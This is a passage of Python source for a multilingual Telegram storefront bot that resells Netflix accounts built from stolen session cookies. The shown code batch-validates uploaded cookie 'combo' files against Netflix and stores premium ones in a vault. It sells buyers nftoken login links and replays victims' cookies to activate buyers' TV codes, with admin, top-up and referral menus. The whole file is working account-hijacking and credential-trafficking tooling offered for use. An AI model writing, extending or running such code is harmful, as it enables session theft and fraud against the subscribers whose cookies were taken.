        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry}, None
    except Exception as e:
        return None, str(e)[:30]


def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR): return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]


def count_vault_cookies():
    return len(get_vault_cookies())


def save_cookie_to_vault(name, cookie_dict):
    os.makedirs(COOKIES_DIR, exist_ok=True)
    base = safe_filename(name)
    dest = os.path.join(COOKIES_DIR, base + ".txt")
    if os.path.exists(dest):
        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        dest = os.path.join(COOKIES_DIR, f"{base}_{suf}.txt")
    try:
        with open(dest, 'w', encoding='utf-8') as f:
            f.write(dict_to_netscape(cookie_dict))
        return True
    except Exception:
        return False


def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files: return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except Exception:
            return None, None


# ============================================================
# TV LOGIN
# ============================================================
def validate_cookie_tv(cookies):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers,
                        timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or 'signin' in r.url.lower(): return False, None, None
        if r.status_code != 200: return False, None, None
        country = None; plan = "Unknown"
        m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
        if not m: m = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if m: country = m.group(1)
        m = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
        if not m: m = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
        if m: plan = m.group(1)
        has_account = 'Account' in r.text or 'membershipStatus' in r.text
        return has_account and country is not None, country, plan
    except Exception:
        return False, None, None


def extract_auth_url(html_text):
    for p in [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
              r'authURL=([^&\s"\']+)', r'value="(c1\.[^"]+)"']:
        m = re.search(p, html_text)
        if m: return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None


def submit_tv_code(session, tv_code):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200: return {"success": False, "error": "TV page down"}
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    auth_url = extract_auth_url(r.text)
    if not auth_url: return {"success": False, "error": "no auth url"}
    post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
    form = {"flow": "websiteSignUp", "authURL": auth_url,
            "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2",
            "code": tv_code, "tvLoginRendezvousCode": tv_code, "action": "nextAction"}
    try:
        r = session.post(url, data=form, headers=post_headers,
                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": str(e)[:40]}
    if "/tv/out/success" in r.url.lower(): return {"success": True, "error": None}
    text = str.lower(re.sub(r'\s+', ' ', html_mod.unescape(re.sub(r'<[^>]+>', ' ', r.text))))
    for p in [r"your tv is ready", r"successfully activated"]:
        if re.search(p, text): return {"success": True, "error": None}
    for p in [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)"]:
        if re.search(p, text): return {"success": False, "error": "Invalid code"}
    return {"success": False, "error": "unknown"}


def process_tv_login(tv_code):
    max_attempts = min(100, max(count_vault_cookies() * 2, 30))
    tried = []
    for _ in range(max_attempts):
        filename, content = get_random_cookie_file()
        if not filename:
            return {"success": False, "error": "no_cookies_left", "tried_countries": tried}
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'):
            continue
        valid, country, plan = validate_cookie_tv(cookies)
        if not valid:
            continue
        if country: tried.append(country)
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code)
        result["country"] = country; result["plan"] = plan
        result["tried_countries"] = tried
        if result["success"]: return result
        if "Invalid" in str(result.get("error", "")): return result
    return {"success": False, "error": "all_failed", "tried_countries": tried}


def _pull_and_link_cookie():
    for _ in range(10):
        filename, content = get_random_cookie_file()
        if not filename:
            return {"ok": False, "error": "vault_empty"}
        ck = extract_cookie_dict_tv(content)
        if not ck or not ck.get('NetflixId'):
            continue
        res = check_netflix_cookie(ck)
        if not res.get("ok") or not res.get("premium"):
            continue
        tok, err = generate_nftoken(ck)
        if not tok:
            continue
        return {
            "ok": True,
            "name": res.get("name", "Unknown"),
            "email": res.get("email", "Unknown"),
            "country": res.get("country", "Unknown"),
            "plan": res.get("plan", "Unknown"),
            "token": tok["token"],
            "expires": tok["expires"],
        }
    return {"ok": False, "error": "no_premium"}


# ============================================================
# NOTIFICATIONS
# ============================================================
async def notify_channel(context, text):
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode="HTML")
    except Exception as e:
        log.warning("channel notify failed: %s", e)


# ============================================================
# MARKUPS — أزرار عرضية
# ============================================================
def get_main_markup(uid):
    rows = [
        [
            InlineKeyboardButton(t(uid, "buy"), callback_data="buy"),
            InlineKeyboardButton(t(uid, "topup"), callback_data="topup"),
        ],
        [
            InlineKeyboardButton(t(uid, "ref"), callback_data="ref_link"),
            InlineKeyboardButton(t(uid, "purchases"), callback_data="my_purchases"),
        ],
        [
            InlineKeyboardButton(t(uid, "account"), callback_data="my_account"),
            InlineKeyboardButton(t(uid, "support"), url=f"https://t.me/{TECH_USERNAME.replace('@','')}"),
        ],
        [
            InlineKeyboardButton(t(uid, "lang"), callback_data="change_lang"),
        ],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton(t(uid, "admin"), callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)


def lang_markup():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🇸🇦 العربية", callback_data="setlang_ar"),
            InlineKeyboardButton("🇫🇴 English", callback_data="setlang_en"),
            InlineKeyboardButton("🇫🇷 Français", callback_data="setlang_fr"),
        ]
    ])


def buy_type_markup(uid):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(t(uid, "phone"), callback_data="buy_phone"),
            InlineKeyboardButton(t(uid, "tv"), callback_data="buy_tv"),
        ],
        [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
    ])


def admin_markup(uid):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(t(uid, "check"), callback_data="admin_check"),
            InlineKeyboardButton(t(uid, "clear"), callback_data="admin_clear"),
        ],
        [
            InlineKeyboardButton(t(uid, "price"), callback_data="admin_set_price"),
            InlineKeyboardButton(t(uid, "market"), callback_data="admin_set_market"),
        ],
        [
            InlineKeyboardButton(t(uid, "addp"), callback_data="admin_add_points"),
            InlineKeyboardButton(t(uid, "remp"), callback_data="admin_remove_points"),
        ],
        [
            InlineKeyboardButton(t(uid, "promote"), callback_data="admin_promote"),
            InlineKeyboardButton(t(uid, "demote"), callback_data="admin_demote"),
        ],
        [
            InlineKeyboardButton(t(uid, "topups"), callback_data="admin_topups"),
            InlineKeyboardButton(t(uid, "stats"), callback_data="admin_stats"),
        ],
        [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
    ])


BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]


async def animate_message(ctx, chat_id, msg_id, stop_event, label="..."):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"{f} {label}")
        except Exception:
            pass
        idx += 1
        await asyncio.sleep(0.3)


# ============================================================
# /start
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    username = msg.from_user.username
    args = context.args or []

    new_user = str(uid) not in load_users()
    user = get_user(uid)
    if username:
        user["username"] = username
        set_user(uid, user)

    if new_user and args and args[0].startswith("ref_"):
        try:
            ref_uid = int(args[0][4:])
            if ref_uid != uid:
                users = load_users()
                if str(ref_uid) in users:
                    users[str(ref_uid)]["points"] = users[str(ref_uid)].get("points", 0) + REFERRAL_POINTS
                    save_users(users)
                    user["referrer"] = ref_uid
                    set_user(uid, user)
                    await notify_channel(context,
                        f"🎁 <b>إحالة جديدة</b>\n👤 <code>{uid}</code> → <code>{ref_uid}</code>\n➕ +{REFERRAL_POINTS}")
                    try:
                        await context.bot.send_message(ref_uid,
                            f"🎁 +{REFERRAL_POINTS} نقطة (إحالة)",
                            parse_mode="HTML")
                    except Exception:
                        pass
        except Exception:
            pass

    user_state[uid] = {"mode": "idle"}

    if new_user or not user.get("lang"):
        await msg.reply_html(TEXTS["ar"]["choose_lang"], reply_markup=lang_markup())
        return

    lang = user.get("lang", "ar")
    await msg.reply_html(
        TEXTS[lang]["welcome"].format(
            name=msg.from_user.first_name or "User",
            points=user.get("points", 0),
            price=get_account_price(),
            market=get_market_price(),
        ),
        reply_markup=get_main_markup(uid))


# ============================================================
# BACK
# ============================================================
async def back_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user_state[uid] = {"mode": "idle"}
    user = get_user(uid)
    lang = user.get("lang", "ar")
    txt = TEXTS[lang]["welcome"].format(
        name=q.from_user.first_name or "User",
        points=user.get("points", 0),
        price=get_account_price(),
        market=get_market_price(),
    )
    try:
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=get_main_markup(uid))
    except Exception:
        await context.bot.send_message(q.message.chat_id, txt, parse_mode="HTML", reply_markup=get_main_markup(uid))


# ============================================================
# ACCOUNT / REF
# ============================================================
async def my_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user = get_user(uid)
    users = load_users()
    referrals = sum(1 for k, v in users.items() if v.get("referrer") == uid)
    txt = t(uid, "acc_info",
            uid=uid, points=user.get('points', 0),
            refs=referrals, purchases=len(user.get('purchases', [])),
            joined=user.get('joined_at', '—'))
    await q.edit_message_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))


async def ref_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    bot_username = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_username}?start=ref_{uid}"
    await q.edit_message_text(
        t(uid, "ref_info", link=link, points=REFERRAL_POINTS),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))


# ============================================================
# TOPUP
# ============================================================
async def topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    if has_pending_topup(uid):
        await q.edit_message_text(
            t(uid, "pending_topup", tech=TECH_USERNAME), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📞", url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
                [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
            ]))
        return
    cfg = load_config()
    await q.edit_message_text(
        t(uid, "topup_info",
          stars=cfg.get("topup_stars", TOPUP_STARS),
          points=cfg.get("topup_points", TOPUP_POINTS),
          tech=TECH_USERNAME),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 " + TECH_USERNAME, url=f"https://t.me/{TECH_USERNAME.replace('@','')}")],
            [InlineKeyboardButton("✅ " + ("تم الدفع" if get_user(uid).get("lang")=="ar" else "Paid"), callback_data="topup_submit")],
            [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
        ]))


async def topup_submit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    if has_pending_topup(uid):
        await q.edit_message_text(t(uid, "already_pending"),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
        return
    create_topup(uid, q.from_user.username)
    cfg = load_config()
    await q.edit_message_text(
        t(uid, "topup_sent") + f"\n\n⭐ {cfg.get('topup_stars', TOPUP_STARS)}\n📞 {TECH_USERNAME}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
    await notify_channel(context,
        f"💰 <b>طلب شحن جديد</b>\n👤 <code>{uid}</code>\n⭐ {cfg.get('topup_stars', TOPUP_STARS)}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


# ============================================================
# BUY
# ============================================================
async def buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user = get_user(uid)
    price = get_account_price()
    points = user.get("points", 0)
    if points < price:
        await q.edit_message_text(
            t(uid, "insufficient", points=points, price=price, need=price-points),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(t(uid, "topup"), callback_data="topup")],
                [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
            ]))
        return
    vault = count_vault_cookies()
    if vault == 0:
        await q.edit_message_text(t(uid, "vault_empty"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
        return
    await q.edit_message_text(
        t(uid, "buy_choose", price=price, points=points, vault=vault),
        parse_mode="HTML", reply_markup=buy_type_markup(uid))


async def buy_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user = get_user(uid)
    price = get_account_price()
    if user.get("points", 0) < price:
        await q.answer("❌", show_alert=True); return
    if count_vault_cookies() == 0:
        await q.answer("❌", show_alert=True); return

    status = await q.edit_message_text("⏳", parse_mode="HTML")
    stop_anim = asyncio.Event()
    anim = asyncio.create_task(animate_message(context, q.message.chat_id, status.message_id, stop_anim, t(uid, "processing")))
    result = await asyncio.to_thread(_pull_and_link_cookie)
    stop_anim.set()
    await asyncio.sleep(0.2)
    try: anim.cancel()
    except Exception: pass

    if not result["ok"]:
        await status.edit_text(t(uid, "vault_empty"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
        return

    new_balance = remove_points(uid, price)
    user = get_user(uid)
    purchase = {
        "type": "phone", "name": result["name"], "email": result["email"],
        "country": result["country"], "plan": result["plan"],
        "token": result["token"], "expires": result["expires"],
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    user.setdefault("purchases", []).append(purchase)
    set_user(uid, user)

    phone_url = f"https://www.netflix.com/unsupported?nftoken={result['token']}"
    pc_url = f"https://www.netflix.com/browse?nftoken={result['token']}"

    await status.edit_text(
        t(uid, "buy_success",
          name=result['name'], email=result['email'], country=result['country'],
          plan=result['plan'], expires=result['expires'], balance=new_balance,
          phone_url=phone_url, pc_url=pc_url),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(t(uid, "buy"), callback_data="buy")],
            [InlineKeyboardButton(t(uid, "back"), callback_data="back_home")],
        ]))

    market = get_market_price()
    await notify_channel(context,
        f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 المشتري: <code>{uid}</code>\n"
        f"📦 الخدمة: حساب المشاهدة (📱 هاتف)\n"
        f"🔢 العدد: 1\n"
        f"💰 السعر: {market} د.جزائري\n"
        f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎬 {STORE_NAME}")


async def buy_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user = get_user(uid)
    price = get_account_price()
    if user.get("points", 0) < price:
        await q.answer("❌", show_alert=True); return
    if count_vault_cookies() == 0:
        await q.answer("❌", show_alert=True); return
    user_state[uid] = {"mode": "awaiting_tv_code"}
    await q.edit_message_text(
        t(uid, "tv_input"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))


async def handle_tv_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if user_state.get(uid, {}).get("mode") != "awaiting_tv_code":
        return
    text = update.message.text.strip()
    code = re.sub(r'\D', '', text)
    if len(code) != 8:
        await update.message.reply_text("❌ 8 " + ("أرقام" if get_user(uid).get("lang")=="ar" else "digits"))
        return
    user_state[uid]["mode"] = "idle"
    user = get_user(uid)
    price = get_account_price()
    if user.get("points", 0) < price:
        await update.message.reply_text(t(uid, "insufficient", points=user.get("points",0), price=price, need=price-user.get("points",0)), parse_mode="HTML")
        return
    if count_vault_cookies() == 0:
        await update.message.reply_text(t(uid, "vault_empty"), parse_mode="HTML")
        return
    status = await update.message.reply_text(f"⏳ {code}")
    stop_anim = asyncio.Event()
    anim = asyncio.create_task(animate_message(context, update.effective_chat.id, status.message_id, stop_anim, t(uid, "processing")))
    result = await asyncio.to_thread(process_tv_login, code)
    stop_anim.set()
    await asyncio.sleep(0.2)
    try: anim.cancel()
    except Exception: pass
    with tv_stats_lock:
        tv_stats["total_logins"] += 1
    if result.get("success"):
        with tv_stats_lock: tv_stats["successful"] += 1
        new_balance = remove_points(uid, price)
        user = get_user(uid)
        user.setdefault("purchases", []).append({
            "type": "tv", "code": code,
            "country": result.get("country", "N/A"),
            "plan": result.get("plan", "N/A"),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        set_user(uid, user)
        await status.edit_text(
            t(uid, "tv_success", code=code, country=result.get("country","N/A"),
              plan=result.get("plan","N/A"), balance=new_balance),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
        market = get_market_price()
        await notify_channel(context,
            f"🛒 <b>عملية شراء جديدة</b> 🛒\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 المشتري: <code>{uid}</code>\n"
            f"📦 الخدمة: حساب المشاهدة (📺 TV)\n"
            f"🔢 العدد: 1\n"
            f"💰 السعر: {market} د.جزائري\n"
            f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🎬 {STORE_NAME}")
    else:
        with tv_stats_lock:
            if result.get("error") == "no_cookies_left":
                tv_stats["failed"] += 1
            else:
                tv_stats["codes_rejected"] += 1
        await status.edit_text(
            t(uid, "tv_failed", error=result.get("error", "unknown")),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))


# ============================================================
# MY PURCHASES
# ============================================================
async def my_purchases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    user = get_user(uid)
    purchases = user.get("purchases", [])
    if not purchases:
        await q.edit_message_text(t(uid, "no_purchases"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))
        return
    items = ""
    for i, p in enumerate(purchases[-10:], 1):
        if p["type"] == "phone":
            items += f"{i}. 📱 {p.get('name','—')} — {p.get('date','—')}\n"
        else:
            items += f"{i}. 📺 <code>{p.get('code','—')}</code> — {p.get('date','—')}\n"
    await q.edit_message_text(
        t(uid, "purchases_list", count=len(purchases), items=items, balance=user.get("points",0)),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="back_home")]]))


# ============================================================
# ADMIN
# ============================================================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    await q.edit_message_text(
        t(uid, "admin_title", price=get_account_price(), market=get_market_price(),
          vault=count_vault_cookies(), topups=len(load_topups())),
        parse_mode="HTML", reply_markup=admin_markup(uid))


async def admin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_check"}
    await q.edit_message_text(t(uid, "check_prompt"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    files = get_vault_cookies()
    n = len(files)
    for f in files:
        try: os.remove(os.path.join(COOKIES_DIR, f))
        except Exception: pass
    await q.answer(f"🗑 {n}", show_alert=True)
    await admin_panel(update, context)


async def admin_set_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_set_price"}
    await q.edit_message_text(t(uid, "price_prompt", current=get_account_price()),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_set_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_set_market"}
    await q.edit_message_text(t(uid, "market_prompt", current=get_market_price()),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_add_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_add_points"}
    await q.edit_message_text(t(uid, "addp_prompt"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_remove_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_remove_points"}
    await q.edit_message_text(t(uid, "remp_prompt"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid != OWNER_ID:
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_promote"}
    await q.edit_message_text(t(uid, "promote_prompt"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid != OWNER_ID:
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    user_state[uid] = {"mode": "admin_demote"}
    await q.edit_message_text(t(uid, "demote_prompt"), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


async def admin_topups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    topups = load_topups()
    if not topups:
        await q.edit_message_text(t(uid, "no_topups"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))
        return
    txt = f"💳 <b>{len(topups)}</b>\n\n"
    rows = []
    for u_id, data in list(topups.items())[:10]:
        txt += f"👤 <code>{u_id}</code> — {data['created_at']}\n"
        rows.append([
            InlineKeyboardButton(f"✅ {u_id}", callback_data=f"apv_{u_id}"),
            InlineKeyboardButton(f"❌ {u_id}", callback_data=f"rej_{u_id}"),
        ])
    rows.append([InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")])
    await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(rows))


async def admin_approve_topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    target = int(q.data.split("_", 1)[1])
    cfg = load_config()
    points = cfg.get("topup_points", TOPUP_POINTS)
    if approve_topup(target, points):
        await q.answer(f"✅ +{points}", show_alert=True)
        try:
            await context.bot.send_message(target,
                f"✅ +{points} points\n💰 {get_user_points(target)}",
                parse_mode="HTML")
        except Exception:
            pass
        await notify_channel(context, f"✅ شحن معتمد: <code>{target}</code> +{points}")
    else:
        await q.answer("⚠️", show_alert=True)
    await admin_topups(update, context)


async def admin_reject_topup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    target = int(q.data.split("_", 1)[1])
    if reject_topup(target):
        await q.answer("❌", show_alert=True)
        try:
            await context.bot.send_message(target, "❌", parse_mode="HTML")
        except Exception:
            pass
    await admin_topups(update, context)


async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if not is_admin(uid):
        await q.answer("🚫", show_alert=True); return
    await q.answer()
    users = load_users()
    total_points = sum(u.get("points", 0) for u in users.values())
    total_purch = sum(len(u.get("purchases", [])) for u in users.values())
    with tv_stats_lock:
        txt = (f"📊 <b>Stats</b>\n\n"
               f"👥 {len(users)}\n💰 {total_points}\n📦 {total_purch}\n"
               f"💳 {len(load_topups())}\n📦 {count_vault_cookies()}\n\n"
               f"🎬 {tv_stats['total_logins']} | ✅ {tv_stats['successful']} | ❌ {tv_stats['failed']}")
    await q.edit_message_text(txt, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(uid, "back"), callback_data="admin_panel")]]))


# ============================================================
# FILE UPLOAD — Combo Check with LOCK
# ============================================================
async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private": return
    uid = update.effective_user.id
    if not is_admin(uid): return
    if user_state.get(uid, {}).get("mode") != "admin_check": return

    if user_locks[uid].locked():
        await update.message.reply_text("⚠️ " + ("فحص جارٍ" if get_user(uid).get("lang")=="ar" else "Already checking"))
        return

    async with user_locks[uid]:
        try:
            file = await update.message.document.get_file()
            ext = update.message.document.file_name.lower()

            with tempfile.TemporaryDirectory() as td:
                tp = os.path.join(td, update.message.document.file_name)
                await file.download_to_drive(tp)

                cookies = []
                if ext.endswith('.zip'):
                    cookies = await extract_cookies_from_zip(tp)
                else:
                    with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    c = parse_cookie_file(content)
                    for idx, (bn, cc) in enumerate(c):
                        if cc.get('NetflixId'):
                            cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))

                seen = set(); dedup = []
                for nm, ck in cookies:
                    h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                    if h not in seen:
                        seen.add(h); dedup.append((nm, ck))

                if not dedup:
                    await update.message.reply_text("❌")
                    return

                status = await update.message.reply_text(
                    f"🔍 {len(dedup)}", parse_mode="HTML")

                if uid not in user_executors:
                    user_executors[uid] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
                executor = user_executors[uid]

                premium = free = invalid = 0
                total = len(dedup); checked = 0
                start_time = time.time()

                for batch_start in range(0, total, BATCH_SIZE):
                    batch = dedup[batch_start:batch_start + BATCH_SIZE]
                    loop = asyncio.get_running_loop()
                    futures = [
                        asyncio.wait_for(loop.run_in_executor(executor, check_netflix_cookie, ck), timeout=35)
                        for nm, ck in batch
                    ]
                    results = await asyncio.gather(*futures, return_exceptions=True)

                    for i, result in enumerate(results):
                        checked += 1
                        nm, ck = batch[i]
                        if isinstance(result, Exception):
                            invalid += 1; continue
                        if result.get("ok"):
                            if result.get("premium"):
                                if save_cookie_to_vault(nm, ck):
                                    premium += 1
                            else:
                                free += 1
                        else:
                            invalid += 1

                    try:
                        filled = min(20, checked * 20 // total) if total > 0 else 20
                        bar = '█' * filled + '░' * (20 - filled)
                        elapsed = time.time() - start_time
                        speed = checked / elapsed if elapsed > 0 else 0
                        eta = (total - checked) / speed if speed > 0 else 0
                        await status.edit_text(
                            f"🔍 <b>فحص</b>\n"
                            f"<code>{bar}</code> {checked}/{total}\n"
                            f"⚡ {speed:.1f}/s | ⏱️ {eta:.0f}s\n\n"
                            f"🌟 {premium} | 🆓 {free} | ❌ {invalid}",
                            parse_mode="HTML")
                    except Exception:
                        pass

